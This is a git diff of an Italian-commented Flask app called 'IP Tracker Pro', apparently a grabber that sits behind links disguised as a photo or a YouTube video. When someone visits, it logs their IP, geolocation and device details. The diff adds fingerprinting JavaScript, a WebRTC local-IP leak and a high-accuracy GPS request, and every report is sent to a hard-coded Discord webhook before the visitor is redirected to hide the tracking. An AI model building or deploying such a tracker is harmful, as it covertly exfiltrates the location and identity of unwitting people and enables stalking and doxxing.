@@ -8,22 +8,34 @@ import json
 
 app = Flask(__name__)
 
-# CONFIGURAZIONE
+# ==================== CONFIGURAZIONE ====================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
 IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"
 
 visit_counter = 0
-# Dizionario temporaneo per memorizzare fingerprint in attesa del secondo report
-pending_fingerprints = {}
+pending_fingerprints = {}  # Per aggiornare il report con fingerprint e dati JS
+
+# ==================== FUNZIONI ====================
+
+def get_client_ip(request):
+    """
+    Estrae SOLO l'IP pubblico del client, ignorando proxy interni.
+    Prende il primo IP da X-Forwarded-For (quello del client reale).
+    """
+    forwarded = request.headers.get('X-Forwarded-For', '')
+    if forwarded:
+        return forwarded.split(',')[0].strip()
+    return request.remote_addr
 
 def get_ip_info(ip):
+    """Ottiene informazioni di geolocalizzazione dall'IP."""
     try:
-        response = requests.get(
-            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
+        resp = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
             timeout=10
         )
-        if response.status_code == 200:
-            data = response.json()
+        if resp.status_code == 200:
+            data = resp.json()
             if data.get("status") == "success":
                 return {
                     "country": data.get("country", "N/D"),
@@ -48,6 +60,7 @@ def get_ip_info(ip):
     return None
 
 def get_device_info(request):
+    """Analizza User-Agent per ottenere dettagli su browser, OS e tipo dispositivo."""
     ua = request.headers.get('User-Agent', '')
     info = {
         "user_agent": ua[:300],
@@ -60,11 +73,13 @@ def get_device_info(request):
         "is_tablet": False,
         "is_bot": False
     }
-    
+
+    # Rilevamento bot
     bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
     if any(bot in ua.lower() for bot in bots):
         info["is_bot"] = True
-    
+
+    # Rilevamento OS
     if 'Windows NT 10' in ua:
         info["os"] = "Windows 10/11"
     elif 'Windows NT 6.3' in ua:
@@ -93,7 +108,8 @@ def get_device_info(request):
         info["os"] = "iOS (iPad)"
         info["is_tablet"] = True
         info["device"] = "Tablet"
-    
+
+    # Rilevamento browser
     if 'Edg/' in ua:
         info["browser"] = "Edge"
         version = re.search(r'Edg/(\d+)', ua)
@@ -112,62 +128,31 @@ def get_device_info(request):
         if version: info["browser_version"] = version.group(1)
     elif 'Opera' in ua or 'OPR/' in ua:
         info["browser"] = "Opera"
-    
+
     return info
 
-def get_all_ips(request):
-    ips = {
-        "ip_pubblico_rete": "N/D",
-        "ip_privato_locale": "N/D",
-        "ip_proxy": "N/D",
-        "x_forwarded_for": "N/D",
-        "x_real_ip": "N/D",
-        "remote_addr": request.remote_addr
-    }
-    
-    forwarded = request.headers.get('X-Forwarded-For', '')
-    if forwarded:
-        ips["x_forwarded_for"] = forwarded
-        ip_list = [ip.strip() for ip in forwarded.split(',')]
-        if ip_list:
-            ips["ip_pubblico_rete"] = ip_list[0]
-            if len(ip_list) > 1:
-                ips["ip_proxy"] = ip_list[-1]
-    
-    real_ip = request.headers.get('X-Real-IP', '')
-    if real_ip:
-        ips["x_real_ip"] = real_ip
-    
-    remote = request.remote_addr
-    if remote.startswith(('192.168.', '10.', '172.', '127.')):
-        ips["ip_privato_locale"] = remote
-    
-    return ips
-
-def build_report(ip_data, ip_info, device_info, request_info, route_name, fingerprint=None):
-    """Costruisce la descrizione completa del report"""
+def build_report(ip, ip_info, device_info, request_info, route_name, fingerprint=None, local_ip=None, gps=None):
+    """
+    Costruisce la descrizione testuale del report per Discord,
+    includendo TUTTE le informazioni raccolte.
+    """
     global visit_counter
     visit_counter += 1
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
-    
+
     description = f"**📅 Data e Ora:** `{date}`\n"
     description += f"**🔢 Visita #:** `{visit_counter}`\n"
     description += f"**🛤️ Route:** `{route_name}`\n\n"
-    
-    # IP Info
+
+    # ---------- SEZIONE IP ----------
     description += "**══════ 🌐 INDIRIZZI IP ══════**\n"
-    description += f"**🔢 IP Pubblico (Rete):** `{ip_data['ip_pubblico_rete']}`\n"
-    if ip_data['ip_privato_locale'] != 'N/D':
-        description += f"**🏠 IP Privato (Locale):** `{ip_data['ip_privato_locale']}`\n"
-    if ip_data['ip_proxy'] != 'N/D':
-        description += f"**🔗 Proxy/VPN:** `{ip_data['ip_proxy']}`\n"
-    description += f"**📡 Remote Addr:** `{ip_data['remote_addr']}`\n"
-    if ip_data['x_forwarded_for'] != 'N/D':
-        description += f"**📋 X-Forwarded-For:** `{ip_data['x_forwarded_for'][:100]}`\n"
-    
-    # Posizione
+    description += f"**🔢 IP Pubblico:** `{ip}`\n"
+    if local_ip:
+        description += f"**🏠 IP Locale (WebRTC):** `{local_ip}`\n"
+
+    # ---------- SEZIONE POSIZIONE (da IP) ----------
     if ip_info:
-        description += "\n**══════ 📍 POSIZIONE ══════**\n"
+        description += "\n**══════ 📍 POSIZIONE (IP) ══════**\n"
         description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')} ({ip_info.get('countryCode', 'N/D')})\n"
         description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}, {ip_info.get('region', 'N/D')} {ip_info.get('zip', 'N/D')}\n"
         description += f"**📍 Coordinate:** {ip_info.get('lat', 'N/D')}, {ip_info.get('lon', 'N/D')}\n"
@@ -176,15 +161,21 @@ def build_report(ip_data, ip_info, device_info, request_info, route_name, finger
         description += f"**🏢 Org:** {ip_info.get('org', 'N/D')}\n"
         description += f"**🔢 AS:** {ip_info.get('as', 'N/D')} ({ip_info.get('asname', 'N/D')})\n"
         description += f"**🔄 Reverse DNS:** {ip_info.get('reverse', 'N/D')}\n"
-        
         flags = []
         if ip_info.get('mobile'): flags.append("📱 Mobile")
         if ip_info.get('proxy'): flags.append("🔒 Proxy/VPN")
         if ip_info.get('hosting'): flags.append("🏢 Hosting/Server")
         if flags:
             description += f"**🚩 Flag:** {' | '.join(flags)}\n"
-    
-    # Dispositivo
+
+    # ---------- SEZIONE GPS (se disponibile) ----------
+    if gps:
+        description += "\n**══════ 📍 POSIZIONE GPS (Esatta) ══════**\n"
+        description += f"**📍 Coordinate:** {gps.get('lat')}, {gps.get('lon')}\n"
+        if gps.get('accuracy'):
+            description += f"**🎯 Precisione:** {gps['accuracy']} metri\n"
+
+    # ---------- SEZIONE DISPOSITIVO ----------
     if device_info:
         description += "\n**══════ 💻 DISPOSITIVO ══════**\n"
         description += f"**🖥️ OS:** {device_info.get('os', 'N/D')} {device_info.get('os_version', '')}\n"
@@ -194,19 +185,12 @@ def build_report(ip_data, ip_info, device_info, request_info, route_name, finger
             description += f"**🤖 BOT RILEVATO!**\n"
         description += f"**🔤 Lingue:** {request_info.get('accept_language', 'N/D')[:80]}\n"
         description += f"**🆔 UA:** `{device_info.get('user_agent', 'N/D')[:150]}`\n"
-    
-    # Richiesta
-    description += "\n**══════ 📡 RICHIESTA ══════**\n"
-    description += f"**🔗 Referrer:** {request_info.get('referrer', 'N/D')[:80]}\n"
-    description += f"**📋 Metodo:** {request_info.get('method', 'N/D')}\n"
-    description += f"**🚫 DNT:** {request_info.get('dnt', 'N/D')}\n"
-    description += f"**🍪 Cookies:** {request_info.get('cookies', 0)}\n"
-    
-    # Fingerprinting (se disponibile)
+
+    # ---------- SEZIONE FINGERPRINTING ----------
     if fingerprint:
         description += "\n**══════ 🔬 FINGERPRINTING ══════**\n"
-        if fingerprint.get('screen'): 
-            description += f"**📺 Risoluzione Reale:** {fingerprint['screen']}"
+        if fingerprint.get('screen'):
+            description += f"**📺 Risoluzione:** {fingerprint['screen']}"
             if fingerprint.get('colorDepth'): description += f" ({fingerprint['colorDepth']})"
             description += "\n"
         if fingerprint.get('viewport'): description += f"**🪟 Viewport:** {fingerprint['viewport']}\n"
@@ -217,10 +201,7 @@ def build_report(ip_data, ip_info, device_info, request_info, route_name, finger
         if fingerprint.get('connection'): description += f"**📶 Rete:** {fingerprint['connection']}\n"
         if fingerprint.get('touch'): description += f"**👆 Touchscreen:** {fingerprint['touch']}\n"
         if fingerprint.get('battery'):
-            description += f"**🔋 Batteria:** {fingerprint['battery']}"
-            if fingerprint.get('charging') is not None:
-                description += f" | {'🔌 In carica' if fingerprint['charging'] else '🔋 Non in carica'}"
-            description += "\n"
+            description += f"**🔋 Batteria:** {fingerprint['battery']}\n"
         if fingerprint.get('gpu'): description += f"**🎮 GPU:** {fingerprint['gpu']}\n"
         if fingerprint.get('gpuVendor'): description += f"**🏢 Vendor GPU:** {fingerprint['gpuVendor']}\n"
         if fingerprint.get('canvas'): description += f"**🎨 Canvas ID:** `{fingerprint['canvas'][:50]}...`\n"
@@ -231,17 +212,26 @@ def build_report(ip_data, ip_info, device_info, request_info, route_name, finger
         if fingerprint.get('cookiesEnabled'): description += f"**🍪 Cookies Abilitati:** {fingerprint['cookiesEnabled']}\n"
         if fingerprint.get('doNotTrack'): description += f"**🚫 Do Not Track:** {fingerprint['doNotTrack']}\n"
         if fingerprint.get('plugins'): description += f"**🔌 Plugin:** {fingerprint['plugins']}\n"
-    
-    # Mappa Google Maps
-    if ip_info and ip_info.get('lat') != 'N/D' and ip_info.get('lon') != 'N/D':
-        description += f"\n**🗺️ Mappa:** [Clicca qui](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})\n"
-    
+
+    # ---------- SEZIONE RICHIESTA HTTP ----------
+    description += "\n**══════ 📡 RICHIESTA ══════**\n"
+    description += f"**🔗 Referrer:** {request_info.get('referrer', 'N/D')[:80]}\n"
+    description += f"**📋 Metodo:** {request_info.get('method', 'N/D')}\n"
+    description += f"**🚫 DNT:** {request_info.get('dnt', 'N/D')}\n"
+    description += f"**🍪 Cookies:** {request_info.get('cookies', 0)}\n"
+
+    # ---------- MAPPA ----------
+    if gps:
+        description += f"\n**🗺️ Mappa GPS:** [Clicca qui](https://www.google.com/maps?q={gps['lat']},{gps['lon']})\n"
+    elif ip_info and ip_info.get('lat') != 'N/D' and ip_info.get('lon') != 'N/D':
+        description += f"\n**🗺️ Mappa IP:** [Clicca qui](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})\n"
+
     return description, date, visit_counter
 
-def send_to_discord(description, ip_data, ip_info, device_info, date, counter):
-    """Invia il report completo a Discord"""
+def send_to_discord(description, ip, ip_info, device_info, date, counter):
+    """Invia il report a Discord."""
     data = {
-        "content": f"🔔 **#{counter}** | `{ip_data['ip_pubblico_rete']}` | {ip_info.get('country', '?') if ip_info else '?'} | {device_info.get('os', '?')}",
+        "content": f"🔔 **#{counter}** | `{ip}` | {ip_info.get('country', '?') if ip_info else '?'} | {device_info.get('os', '?')}",
         "embeds": [{
             "title": "🎯 REPORT COMPLETO",
             "description": description,
@@ -250,23 +240,23 @@ def send_to_discord(description, ip_data, ip_info, device_info, date, counter):
             "footer": {"text": f"IP Tracker Pro • Visita #{counter}"}
         }]
     }
-    
     try:
-        response = requests.post(WEBHOOK_URL, json=data)
-        if response.status_code == 204:
-            print(f"✅ Report #{counter}")
-        elif response.status_code == 429:
+        resp = requests.post(WEBHOOK_URL, json=data)
+        if resp.status_code == 204:
+            print(f"✅ Report #{counter} inviato")
+        elif resp.status_code == 429:
             time.sleep(2)
             requests.post(WEBHOOK_URL, json=data)
-    except:
-        pass
+    except Exception as e:
+        print(f"❌ Errore invio Discord: {e}")
 
-# ============ ROUTES ============
+# ==================== ROTTE ====================
 
 @app.route("/")
 def index():
-    ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    """Rotta principale: tracciamento immediato + fingerprinting + WebRTC + GPS."""
+    ip = get_client_ip(request)
+    ip_info = get_ip_info(ip)
     device_info = get_device_info(request)
     request_info = {
         "method": request.method,
@@ -275,28 +265,23 @@ def index():
         "dnt": request.headers.get('DNT', 'N/D'),
         "cookies": len(request.cookies)
     }
-    
-    # Genera un ID unico per questa visita
+
+    # Prima invio del report base (senza fingerprint)
+    description, date, counter = build_report(ip, ip_info, device_info, request_info, "Home")
+    send_to_discord(description, ip, ip_info, device_info, date, counter)
+
+    # Salvo i dati in attesa del fingerprint
     visit_id = str(int(time.time() * 1000))
-    
-    # Costruisci report base (senza fingerprint)
-    description, date, counter = build_report(ip_data, ip_info, device_info, request_info, "Home")
-    
-    # Salva temporaneamente i dati per quando arriverà il fingerprint
     pending_fingerprints[visit_id] = {
-        "description": description,
-        "ip_data": ip_data,
+        "ip": ip,
         "ip_info": ip_info,
         "device_info": device_info,
+        "request_info": request_info,
         "date": date,
-        "counter": counter,
-        "request_info": request_info
+        "counter": counter
     }
-    
-    # Invia SUBITO il report base
-    send_to_discord(description, ip_data, ip_info, device_info, date, counter)
-    
-    # Pagina con fingerprinting che invia i dati e POI reindirizza
+
+    # Pagina HTML con JavaScript per raccogliere fingerprint, IP locale e GPS
     return f"""
     <!DOCTYPE html>
     <html>
@@ -308,65 +293,35 @@ def index():
     <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
         <p style="color:#fff;font-family:Arial;font-size:18px;">Caricamento...</p>
         <script>
-            var fp = {{}};
-            var visitId = '{visit_id}';
-            
-            // Risoluzione REALE (screen.width/height)
+            var fp = {{}}, visitId = '{visit_id}';
+
+            // Fingerprinting di base
             fp.screen = screen.width + 'x' + screen.height;
             fp.colorDepth = screen.colorDepth + ' bit';
-            
-            // Viewport (area visibile)
             fp.viewport = window.innerWidth + 'x' + window.innerHeight;
-            
-            // Pixel ratio (per schermi retina)
             fp.pixelRatio = window.devicePixelRatio || '?';
-            
-            // Piattaforma
             fp.platform = navigator.platform || '?';
-            
-            // CPU Cores
             fp.cpuCores = navigator.hardwareConcurrency || '?';
-            
-            // RAM (solo Chrome)
             fp.ram = navigator.deviceMemory || '?';
-            
-            // Tipo connessione
             if (navigator.connection) {{
                 fp.connection = navigator.connection.effectiveType || '?';
-                if (navigator.connection.downlink) {{
-                    fp.connection += ' (' + navigator.connection.downlink + ' Mbps)';
-                }}
-            }} else {{
-                fp.connection = '?';
-            }}
-            
-            // Touchscreen
+                if (navigator.connection.downlink) fp.connection += ' (' + navigator.connection.downlink + ' Mbps)';
+            }} else fp.connection = '?';
             fp.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Si' : 'No';
-            
-            // Timezone browser
             fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            // Lingua
             fp.language = navigator.language;
-            
-            // Cookies
             fp.cookiesEnabled = navigator.cookieEnabled ? 'Si' : 'No';
-            
-            // Do Not Track
             fp.doNotTrack = navigator.doNotTrack || 'Non impostato';
-            
-            // Batteria (con await)
-            function getBattery() {{
-                if (navigator.getBattery) {{
-                    navigator.getBattery().then(function(b) {{
-                        fp.battery = Math.round(b.level * 100) + '%';
-                        fp.charging = b.charging;
-                    }}).catch(function(){{}});
-                }}
+
+            // Batteria
+            if (navigator.getBattery) {{
+                navigator.getBattery().then(function(b) {{
+                    fp.battery = Math.round(b.level * 100) + '%';
+                    if (b.charging) fp.battery += ' (in carica)';
+                }});
             }}
-            getBattery();
-            
-            // GPU / WebGL
+
+            // GPU via WebGL
             try {{
                 var c = document.createElement('canvas');
                 var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
@@ -378,25 +333,19 @@ def index():
                     }}
                 }}
             }} catch(e) {{}}
-            
-            // Canvas Fingerprint
+
+            // Canvas fingerprint
             try {{
                 var c2 = document.createElement('canvas');
-                c2.width = 200;
-                c2.height = 50;
+                c2.width = 200; c2.height = 50;
                 var ctx = c2.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Browser Fingerprint 123!', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Browser Fingerprint 123!', 4, 17);
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069'; ctx.fillText('Test 123!', 2, 15);
                 fp.canvas = c2.toDataURL().substring(0, 80);
             }} catch(e) {{}}
-            
-            // WebGL Fingerprint
+
+            // WebGL fingerprint
             try {{
                 var c3 = document.createElement('canvas');
                 var gl2 = c3.getContext('webgl') || c3.getContext('experimental-webgl');
@@ -410,62 +359,86 @@ def index():
                     fp.webgl = params.join('|').substring(0, 80);
                 }}
             }} catch(e) {{}}
-            
-            // Font Detection (base)
+
+            // Font detection base
             try {{
-                var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma', 'Lucida Console'];
+                var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
                 var testStr = 'mmmmmmmmmmlli';
                 var testSize = '72px';
                 var available = [];
                 var testEl = document.createElement('span');
                 testEl.style.fontSize = testSize;
-                testEl.style.position = 'absolute';
                 testEl.style.visibility = 'hidden';
                 testEl.innerHTML = testStr;
                 document.body.appendChild(testEl);
-                
-                var baseWidth = testEl.offsetWidth;
-                testEl.style.fontFamily = 'monospace';
                 var monoWidth = testEl.offsetWidth;
-                
                 for (var i = 0; i < fonts.length; i++) {{
                     testEl.style.fontFamily = fonts[i] + ', monospace';
-                    if (testEl.offsetWidth !== monoWidth) {{
-                        available.push(fonts[i]);
-                    }}
+                    if (testEl.offsetWidth !== monoWidth) available.push(fonts[i]);
                 }}
-                
                 document.body.removeChild(testEl);
                 fp.fonts = available.length + '/' + fonts.length + ' rilevati';
             }} catch(e) {{}}
-            
-            // Plugin
+
+            // Plugin browser
             try {{
                 if (navigator.plugins && navigator.plugins.length > 0) {{
                     var plist = [];
                     for (var i = 0; i < Math.min(navigator.plugins.length, 5); i++) {{
-                        if (navigator.plugins[i].name) {{
-                            plist.push(navigator.plugins[i].name);
-                        }}
+                        if (navigator.plugins[i].name) plist.push(navigator.plugins[i].name);
                     }}
                     fp.plugins = plist.length > 0 ? plist.join(', ') : 'Nessuno';
-                }} else {{
-                    fp.plugins = 'Nessuno';
-                }}
+                }} else fp.plugins = 'Nessuno';
             }} catch(e) {{ fp.plugins = '?'; }}
-            
-            // Aspetta un attimo per la batteria poi invia
-            setTimeout(function() {{
+
+            // WebRTC per IP locale
+            function getLocalIP() {{
+                return new Promise((resolve) => {{
+                    var pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:stun.l.google.com:19302" }}] }});
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (e) => {{
+                        if (!e.candidate) return;
+                        var candidate = e.candidate.candidate;
+                        var ipRegex = /([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)/;
+                        var match = candidate.match(ipRegex);
+                        if (match) {{
+                            pc.close();
+                            resolve(match[1]);
+                        }}
+                    }};
+                    setTimeout(() => {{ pc.close(); resolve(null); }}, 2000);
+                }});
+            }}
+
+            // GPS
+            function getGPS() {{
+                return new Promise((resolve) => {{
+                    if (!navigator.geolocation) {{ resolve(null); return; }}
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve({{ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }}),
+                        (err) => resolve(null),
+                        {{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }}
+                    );
+                }});
+            }}
+
+            // Invia tutto al server
+            async function sendData() {{
+                var localIP = await getLocalIP();
+                var gps = await getGPS();
+                var payload = {{ fingerprint: fp, localIP: localIP, gps: gps }};
                 fetch('/fp?vid=' + visitId, {{
                     method: 'POST',
-                    body: JSON.stringify(fp),
+                    body: JSON.stringify(payload),
                     headers: {{'Content-Type': 'application/json'}}
-                }}).then(function() {{
+                }}).then(() => {{
                     window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
-                }}).catch(function() {{
+                }}).catch(() => {{
                     window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
                 }});
-            }}, 800);
+            }}
+            sendData();
         </script>
     </body>
     </html>
@@ -476,16 +449,20 @@ def index():
 @app.route("/photo")
 @app.route("/pic")
 def image_tracker():
-    ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    """Tracciamento con immagine cliccabile (senza fingerprinting)."""
+    ip = get_client_ip(request)
+    ip_info = get_ip_info(ip)
     device_info = get_device_info(request)
-    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
-                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
-                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
-    
-    description, date, counter = build_report(ip_data, ip_info, device_info, request_info, "Immagine")
-    send_to_discord(description, ip_data, ip_info, device_info, date, counter)
-    
+    request_info = {
+        "method": request.method,
+        "referrer": request.headers.get('Referer', 'N/D'),
+        "accept_language": request.headers.get('Accept-Language', 'N/D'),
+        "dnt": request.headers.get('DNT', 'N/D'),
+        "cookies": len(request.cookies)
+    }
+    description, date, counter = build_report(ip, ip_info, device_info, request_info, "Immagine")
+    send_to_discord(description, ip, ip_info, device_info, date, counter)
+
     return f"""
     <!DOCTYPE html>
     <html>
@@ -523,60 +500,57 @@ def image_tracker():
 @app.route("/watch")
 @app.route("/yt")
 def video_preview():
-    ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    """Tracciamento con redirect immediato al video."""
+    ip = get_client_ip(request)
+    ip_info = get_ip_info(ip)
     device_info = get_device_info(request)
-    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
-                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
-                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
-    
-    description, date, counter = build_report(ip_data, ip_info, device_info, request_info, "Video")
-    send_to_discord(description, ip_data, ip_info, device_info, date, counter)
+    request_info = {
+        "method": request.method,
+        "referrer": request.headers.get('Referer', 'N/D'),
+        "accept_language": request.headers.get('Accept-Language', 'N/D'),
+        "dnt": request.headers.get('DNT', 'N/D'),
+        "cookies": len(request.cookies)
+    }
+    description, date, counter = build_report(ip, ip_info, device_info, request_info, "Video")
+    send_to_discord(description, ip, ip_info, device_info, date, counter)
     return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
 
-# Endpoint fingerprint - AGGIORNA il report esistente
 @app.route("/fp", methods=["POST"])
 def receive_fingerprint():
-    global pending_fingerprints
-    
+    """
+    Riceve i dati fingerprint, IP locale e GPS dal JavaScript,
+    quindi invia un secondo report Discord aggiornato.
+    """
+    global pending_fingerprints, visit_counter
     try:
-        fp = request.get_json()
+        data = request.get_json()
+        if not data:
+            return "ok", 200
+
         visit_id = request.args.get('vid', '')
-        
-        if fp and visit_id and visit_id in pending_fingerprints:
-            # Recupera i dati salvati
-            data = pending_fingerprints[visit_id]
-            
-            # Ricostruisci la descrizione CON il fingerprint
-            description, date, counter = build_report(
-                data["ip_data"],
-                data["ip_info"],
-                data["device_info"],
-                data["request_info"],
-                "Home",
-                fingerprint=fp  # <-- QUI AGGIUNGE IL FINGERPRINT
-            )
-            
-            # Aggiorna il contatore (sottrai 1 perché build_report lo incrementa di nuovo)
-            global visit_counter
+        fp = data.get('fingerprint', {})
+        local_ip = data.get('localIP')
+        gps = data.get('gps')
+
+        if visit_id in pending_fingerprints:
+            info = pending_fingerprints[visit_id]
+            # Decremento contatore perché build_report lo incrementerà di nuovo
             visit_counter -= 1
             description, date, counter = build_report(
-                data["ip_data"],
-                data["ip_info"],
-                data["device_info"],
-                data["request_info"],
+                info["ip"],
+                info["ip_info"],
+                info["device_info"],
+                info["request_info"],
                 "Home",
-                fingerprint=fp
+                fingerprint=fp,
+                local_ip=local_ip,
+                gps=gps
             )
-            
-            # Invia il report AGGIORNATO
-            send_to_discord(description, data["ip_data"], data["ip_info"], data["device_info"], date, counter)
-            
-            # Rimuovi dai pending
+            send_to_discord(description, info["ip"], info["ip_info"], info["device_info"], date, counter)
             del pending_fingerprints[visit_id]
-            print(f"✅ Report aggiornato con fingerprint")
-    except:
-        pass
+            print(f"✅ Report aggiornato con fingerprint, IP locale e GPS")
+    except Exception as e:
+        print(f"❌ Errore nella ricezione fingerprint: {e}")
     return "ok", 200
 
 if __name__ == "__main__":
